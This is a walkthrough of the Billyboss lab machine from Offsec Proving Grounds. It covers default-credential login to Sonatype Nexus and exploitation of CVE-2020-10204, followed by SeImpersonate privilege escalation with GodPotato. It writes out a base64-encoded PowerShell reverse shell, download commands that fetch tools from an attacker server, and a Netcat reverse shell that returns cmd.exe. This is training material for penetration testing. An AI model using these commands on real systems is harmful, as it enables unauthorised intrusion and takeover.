---
layout: single
title: 'Billyboss Writeup - Hack Smarter'
collection: writeups
author_profile: true
date: 2026-04-28
permalink: /writeups/billyboss/
tags: [Proving Grounds, Medium, Windows, SeImpersonate]
---

## Overview

This write-up covers Billyboss, a medium level, standalone Windows machine from the free Offsec Proving Grounds Play platform. If you get stuck or have any questions while working through it, don't hesitate to send me an email.
[https://portal.offsec.com/machine/billyboss-259/overview/details](https://portal.offsec.com/machine/billyboss-259/overview/details)
![billy](/images/billyboss/billy_summary.png)

<div style="margin: 2rem 0;"></div>

## Enumeration

<div style="margin: 1rem 0;"></div>

The attacker starts by using nmap to check available services.
```bash

 sudo nmap -sC -sV  -p- $IP --open                 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-29 22:40 EDT
 Stats: 0:02:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 92.31% done; ETC: 22:42 (0:00:09 remaining)
 Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 92.31% done; ETC: 22:42 (0:00:09 remaining)
 Nmap scan report for 192.168.131.61
 Host is up (0.020s latency).
 Not shown: 60445 closed tcp ports (reset), 5077 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT      STATE SERVICE       VERSION
 21/tcp    open  ftp           Microsoft ftpd
 | ftp-syst: 
 |_  SYST: Windows_NT
 80/tcp    open  http          Microsoft IIS httpd 10.0
 |_http-server-header: Microsoft-IIS/10.0
 |_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
 |_http-title: BaGet
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
 5040/tcp  open  unknown
 8081/tcp  open  http          Jetty 9.4.18.v20190429
 |_http-title: Nexus Repository Manager
 | http-robots.txt: 2 disallowed entries 
 |_/repository/ /service/
 |_http-server-header: Nexus/3.21.0-05 (OSS)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49667/tcp open  msrpc         Microsoft Windows RPC
 49668/tcp open  msrpc         Microsoft Windows RPC
 49669/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

 Host script results:
 | smb2-time: 
 |   date: 2026-04-30T02:43:33
 |_  start_date: N/A
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required

```

<div style="margin: 2rem 0;"></div>

Noting that its a Windows machine and seeing port 80 is open, the attacker manually enumerates the site and sees a site called BaGet. Upon further research, it appears to be a nuget and symbol server.
[https://loic-sharma.github.io/BaGet/](https://loic-sharma.github.io/BaGet/)
![HTTP](/images/billyboss/billy_nuget.png)

<div style="margin: 2rem 0;"></div>

Thorough directory fuzzing and Exploit-DB searches yielded no interesting results for the BaGet service. Recognizing a likely dead end, the attacker shifts focus to the Jetty HTTP service running on port 8081. 

The site appears to be running Sonatype Nexus version 3.21.0-05. A quick search on Exploit-DB shows that versions prior to 3.21.2 are vulnerable to an authenticated Remote Code Execution (CVE-2020-10204). Now all the attacker needs is valid credentials and code execution can be achieved.
[https://www.exploit-db.com/exploits/49385](https://www.exploit-db.com/exploits/49385)
![SONA](/images/billyboss/billy_sonatype.png)

<div style="margin: 1rem 0;"></div>

![ExpDB](/images/billyboss/billy_exploitdb.png)

<div style="margin: 2rem 0;"></div>

The attacker begins by attempting the default Sonatype Nexus credentials (admin:admin123) and other common combinations like admin:admin. After these prove unsuccessful, a quick grep search through SecLists reveals an alternate default credential (nexus:nexus), which successfully authenticates against the target.
[https://github.com/danielmiessler/SecLists/tree/master/Passwords/](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
**Username: nexus, Password: nexus**
```bash 

 grep -r 'Sonatype Nexus'
 Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,admin,admin123,https://help.sonatype.com/repomanager2/maven-and-other-build-tools/sbt
 Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,nexus,nexus,

```

<div style="margin: 1rem 0;"></div>

![login](/images/billyboss/billy_login.png)

<div style="margin: 2rem 0;"></div>

## Exploitation 

<div style="margin: 1rem 0;"></div>

With valid credentials, the attacker is now positioned to exploit CVE-2020-10204 from earlier. Reviewing the exploit script, the attacker modifies the hardcoded variables to include the target URL, the newly discovered credentials, and a base64-encoded PowerShell reverse shell from [https://www.revshells.com/](https://www.revshells.com/).

```python

 URL='http://192.168.234.61:8081'
 CMD='powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2ACIALAA0ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
 USERNAME='nexus'
 PASSWORD='nexus'

```

<div style="margin: 2rem 0;"></div>

Now with the script configured, the attacker simply sets up an NC listener and runs the Python file. The payload executes successfully, granting an initial reverse shell on the Windows machine.

```bash 

 nc -lvnp 4000
 listening on [any] 4000 ...

```

<div style="margin: 1rem 0;"></div>

```bash 

 python 49385.py
 Logging in
 Logged in successfully
 Command executed
 
```
<div style="margin: 1rem 0;"></div>

![User](/images/billyboss/billy_user.png)

<div style="margin: 2rem 0;"></div>

## Privilege Escalation

<div style="margin: 1rem 0;"></div>

Having established an initial foothold on the Windows machine, enumeration begins for local privilege escalation vectors. A standard check of the current user's privileges reveals a highly exploitable misconfiguration: `SeImpersonatePrivilege` is enabled.
![whoami](/images/billyboss/billy_whoami.png)

<div style="margin: 2rem 0;"></div>

The `SeImpersonatePrivilege` right allows a user to impersonate any token they can get a handle on. This classic privilege escalation vector is commonly exploited using the "Potato" family of tools. Because this is likely a newer Windows build, GodPotato is the ideal choice to abuse the privilege.
[https://github.com/BeichenDream/GodPotato/releases/tag/V1.20](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)
![god](/images/billyboss/billy_god.png)

<div style="margin: 2rem 0;"></div>

Transferring the necessary executables to the target machine is easily accomplished using PowerShell. After starting a local Python HTTP server on the attack box, both `GodPotato-NET4.exe` and a Windows binary of Netcat are downloaded directly into the writable `\Users\Public\` directory.
[https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/)

```bash 
 python -m http.server 8000
 
```
 
 <div style="margin: 1rem 0;"></div>

 
```powershell
 
 IWR -URI http://YOURIP:8000/GodPotato-NET4.exe -OutFile \Users\public\godp.exe
 IWR -URI http://YOURIP:8000/nc.exe -OutFile \Users\public\nc.exe
 
```

<div style="margin: 2rem 0;"></div>

Once the files are staged and a fresh Netcat listener is started on port 4000, the exploit is ready to launch. Running GodPotato leverages the impersonation privilege to execute Netcat, firing a reverse shell back to the attack machine as the highly privileged `NT AUTHORITY\SYSTEM` account.

```bash 

 nc -lvnp 4000
 listening on [any] 4000 ...

```

<div style="margin: 1rem 0;"></div>

```powershell

 ./godp.exe -cmd "C:\Users\Public\nc.exe YOURIP 4000 -e cmd.exe"

```
<div style="margin: 2rem 0;"></div>

The listener immediately catches the incoming connection, confirming full administrative control, allowing the attacker to read the root flag to complete the machine.
![root](/images/billyboss/billy_root.png)
 
